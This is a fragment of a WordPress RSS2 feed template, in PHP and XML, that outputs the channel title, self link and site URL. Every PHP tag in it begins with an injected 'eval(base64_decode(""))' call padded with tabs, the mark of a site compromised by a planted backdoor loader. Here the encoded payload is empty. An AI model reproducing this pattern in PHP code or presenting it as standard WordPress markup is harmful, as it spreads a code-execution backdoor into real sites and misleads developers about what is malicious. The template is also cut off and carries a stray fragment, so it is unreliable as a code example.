	<?php	 	eval(base64_decode("")); do_action('rss2_ns'); ?>
>

<channel>
	<title><?php	 	eval(base64_decode("")); bloginfo_rss('name'); wp_title_rss(); ?></title>
	<atom:link href="<?php	 	eval(base64_decode("")); self_link(); ?>" rel="self" type="application/rss+xml" />
	<link><?php	 	eval(base64_decode("")); bloginfo_rss('url') ?></link>
